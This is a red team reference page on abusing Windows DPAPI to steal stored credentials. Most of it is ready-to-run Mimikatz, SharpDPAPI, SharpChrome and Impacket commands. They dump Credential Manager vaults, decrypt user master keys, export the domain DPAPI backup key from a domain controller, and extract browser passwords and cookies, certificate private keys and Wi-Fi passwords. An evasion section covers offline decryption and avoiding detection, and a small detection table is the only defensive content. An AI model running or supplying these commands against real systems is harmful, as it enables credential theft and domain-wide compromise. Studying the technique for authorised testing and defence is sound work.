# DPAPI Abuse

> **MITRE ATT&CK**: Credential Access > T1555.004 - Credentials from Password Stores: Windows Credential Manager
> **Platforms**: Windows
> **Required Privileges**: User (own credentials) / Local Admin (other users) / Domain Admin (backup key)
> **OPSEC Risk**: Low-Medium

## Strategic Overview

DPAPI (Data Protection Application Programming Interface) is Windows' built-in mechanism
for encrypting sensitive user data. Nearly every application that stores credentials on
Windows uses DPAPI under the hood. Understanding DPAPI is essential for a Red Team Lead
because it unlocks access to a massive range of stored credentials that are often
overlooked in favor of LSASS dumping.

**What DPAPI protects (and what you can decrypt):**
- Browser saved passwords (Chrome, Edge, IE, Brave)
- Browser cookies (session hijacking)
- Windows Credential Manager entries (RDP, SMB saved creds)
- Wi-Fi passwords
- Outlook/Office credentials
- Certificate private keys
- VPN credentials
- Third-party application secrets

**The DPAPI hierarchy:**
1. **User Master Key** - Encrypted with user's password hash, stored in %APPDATA%\Microsoft\Protect\{SID}\{GUID}
2. **Machine Master Key** - Encrypted with DPAPI_SYSTEM LSA secret, stored in %SYSTEMROOT%\System32\Microsoft\Protect\S-1-5-18\
3. **Domain Backup Key** - RSA key pair stored on DCs; can decrypt ANY user master key in the domain

**Strategic value of the domain backup key:** With the domain DPAPI backup key, you can
decrypt every DPAPI-protected secret for every user across the entire domain -- without
knowing any user's password. This is one of the most powerful post-exploitation capabilities.

## Technical Deep-Dive

### 1. Understanding DPAPI Blob Structure

```
# DPAPI encrypted blobs contain metadata including:
# - Provider GUID
# - Master Key GUID (tells you which master key to use)
# - Algorithm identifiers
# - Encrypted data

# User master keys location:
# %APPDATA%\Microsoft\Protect\{UserSID}\{MasterKeyGUID}

# Machine master keys location:
# C:\Windows\System32\Microsoft\Protect\S-1-5-18\User\{GUID}
```

### 2. Credential Manager Extraction

```cmd
# List saved Windows credentials
cmdkey /list
vaultcmd /listcreds:"Windows Credentials" /all
vaultcmd /listcreds:"Web Credentials" /all

# Mimikatz - dump Credential Manager
mimikatz.exe "privilege::debug" "token::elevate" "vault::cred /patch" "exit"

# Mimikatz - list vault credentials
mimikatz.exe "vault::list" "exit"

# DPAPI credential blob locations:
# %APPDATA%\Microsoft\Credentials\{GUID}
# %LOCALAPPDATA%\Microsoft\Credentials\{GUID}
dir /a %APPDATA%\Microsoft\Credentials\
dir /a %LOCALAPPDATA%\Microsoft\Credentials\
```

### 3. Decrypting User DPAPI Blobs with Mimikatz

```
# Step 1: Identify the credential blob
mimikatz.exe "dpapi::cred /in:C:\Users\victim\AppData\Roaming\Microsoft\Credentials\{GUID}" "exit"
# Note the guidMasterKey value from output

# Step 2: Decrypt the master key (need user's password or be running as that user)
mimikatz.exe "dpapi::masterkey /in:C:\Users\victim\AppData\Roaming\Microsoft\Protect\{SID}\{MasterKeyGUID} /password:UserPassword123" "exit"
# Or if running as the user:
mimikatz.exe "dpapi::masterkey /in:C:\Users\victim\AppData\Roaming\Microsoft\Protect\{SID}\{MasterKeyGUID} /rpc" "exit"

# Step 3: Decrypt the credential blob with the decrypted master key
mimikatz.exe "dpapi::cred /in:C:\Users\victim\AppData\Roaming\Microsoft\Credentials\{GUID} /masterkey:{DecryptedMasterKey}" "exit"
```

### 4. SharpDPAPI (Automated Extraction)

```
# Triage all DPAPI-protected credentials for current user
SharpDPAPI.exe triage

# Triage with a known master key
SharpDPAPI.exe triage /password:UserPassword123

# Machine credential triage (requires Admin)
SharpDPAPI.exe machinetriage

# Extract Chrome/Edge credentials
SharpDPAPI.exe browsers

# Dump all credentials, certificates, and vaults
SharpDPAPI.exe credentials /password:UserPassword123
SharpDPAPI.exe vaults /password:UserPassword123
SharpDPAPI.exe certificates /password:UserPassword123

# Using domain backup key to decrypt everything
SharpDPAPI.exe credentials /pvk:domain_backup_key.pvk
SharpDPAPI.exe machinetriage /pvk:domain_backup_key.pvk

# Via Cobalt Strike
execute-assembly SharpDPAPI.exe triage
```

### 5. Domain Backup Key Extraction

```
# Mimikatz - extract the domain DPAPI backup key (requires DA)
mimikatz.exe "lsadump::backupkeys /system:dc01.corp.local /export" "exit"
# Exports: ntds_capi_0_GUID.pfx and ntds_legacy_0_GUID.key

# Using the backup key to decrypt any user's master key
mimikatz.exe "dpapi::masterkey /in:{MasterKeyFile} /pvk:ntds_legacy_0_GUID.key" "exit"

# Then decrypt any credential blob
mimikatz.exe "dpapi::cred /in:{CredentialBlob} /masterkey:{DecryptedKey}" "exit"

# Impacket - extract backup keys
dpapi.py backupkeys -t corp.local/admin:Password123@dc01.corp.local --export
```

### 6. Chrome / Edge Credential Extraction

```
# Chrome Local State file contains DPAPI-encrypted AES key
# %LOCALAPPDATA%\Google\Chrome\User Data\Local State

# Chrome Login Data database
# %LOCALAPPDATA%\Google\Chrome\User Data\Default\Login Data

# SharpChrome - automated browser credential extraction
SharpChrome.exe logins
SharpChrome.exe cookies
SharpChrome.exe logins /browser:edge

# Mimikatz approach
mimikatz.exe "dpapi::chrome /in:\"%LOCALAPPDATA%\Google\Chrome\User Data\Default\Login Data\" /unprotect" "exit"

# Edge (Chromium) - same mechanism, different path
# %LOCALAPPDATA%\Microsoft\Edge\User Data\Default\Login Data

# Firefox uses its own key storage (not DPAPI)
# Use tools like firefox_decrypt.py or firepwd.py
```

### 7. Offline DPAPI Decryption

```bash
# When you have extracted master key files and credential blobs offline

# Using Impacket dpapi.py
dpapi.py unprotect -file credential_blob -key {MasterKeyHex}

# Decrypt master key with domain backup key
dpapi.py masterkey -file {MasterKeyFile} -pvk domain_backup.pvk

# Decrypt master key with user password
dpapi.py masterkey -file {MasterKeyFile} -sid {UserSID} -password UserPassword123

# Full chain: decrypt master key then credential
dpapi.py credential -file {CredBlob} -key {DecryptedMasterKey}
```

### 8. Certificate Private Key Extraction via DPAPI

```
# Certificates with private keys are DPAPI-protected
# Location: %APPDATA%\Microsoft\SystemCertificates\My\Certificates\

# Extract and decrypt certificate private keys
SharpDPAPI.exe certificates

# Mimikatz
mimikatz.exe "crypto::certificates /export /systemstore:CERT_SYSTEM_STORE_CURRENT_USER" "exit"

# Stolen certificates can be used for:
# - Smart card authentication impersonation
# - Code signing
# - ADCS-based attacks (ESC scenarios)
```

### 9. Wi-Fi Password Extraction

```cmd
# List saved Wi-Fi profiles
netsh wlan show profiles

# Extract password for a specific SSID (plaintext output)
netsh wlan show profile name="CorpWiFi" key=clear

# Bulk extraction (all profiles)
for /f "tokens=2 delims=:" %i in ('netsh wlan show profiles ^| findstr "Profile"') do @netsh wlan show profile name="%i" key=clear 2>nul | findstr "Key Content"

# Wi-Fi passwords are stored via DPAPI in:
# C:\ProgramData\Microsoft\Wlansvc\Profiles\Interfaces\{GUID}\{ProfileGUID}.xml
# Encrypted with machine DPAPI key
```

## Detection & Evasion

### Detection Indicators

| Indicator | Source | Detail |
|-----------|--------|--------|
| CryptUnprotectData calls | EDR API monitoring | Bulk DPAPI decryption activity |
| Master key file access | Sysmon Event ID 11, 15 | Access to Protect\{SID}\ directory |
| Backup key extraction | Event ID 4662 | BCKUPKEY_ secret access on DC |
| Credential file access | Sysmon Event ID 1 | Tools accessing Credentials directory |
| Chrome DB access | EDR file monitoring | Non-Chrome process reading Login Data |

### Evasion Techniques

1. **Run as the target user** - CryptUnprotectData decrypts seamlessly for the owning user
2. **Offline extraction** - Copy files, decrypt on attacker machine with backup key
3. **Legitimate tool appearance** - DPAPI calls are normal Windows API usage
4. **Avoid mass decryption** - Target specific credential files rather than sweeping
5. **Use domain backup key offline** - Decrypt extracted master keys on your own system

## Cross-References

- [LSASS Dumping](lsass-dumping.md) - Extract DPAPI master keys from LSASS memory
- [SAM & LSA Secrets](sam-lsa-secrets.md) - DPAPI_SYSTEM key in LSA Secrets
- [Credential Stores](credential-stores.md) - Browser and application credential extraction
- [DCSync](dcsync.md) - Obtain user password hashes to decrypt master keys
- ../09-persistence/ - DPAPI backup key as persistent credential access mechanism
- ../12-active-directory-deep-dive/ - ADCS certificate abuse scenarios

## References

- https://attack.mitre.org/techniques/T1555/004/
- https://www.harmj0y.net/blog/redteaming/operational-guidance-for-offensive-user-dpapi-abuse/
- https://github.com/GhostPack/SharpDPAPI
- https://github.com/gentilkiwi/mimikatz/wiki/module-~-dpapi
- https://posts.specterops.io/operational-guidance-for-offensive-user-dpapi-abuse-1fb7fac8b107
- https://www.thehacker.recipes/ad/movement/credentials/dumping/dpapi-protected-secrets
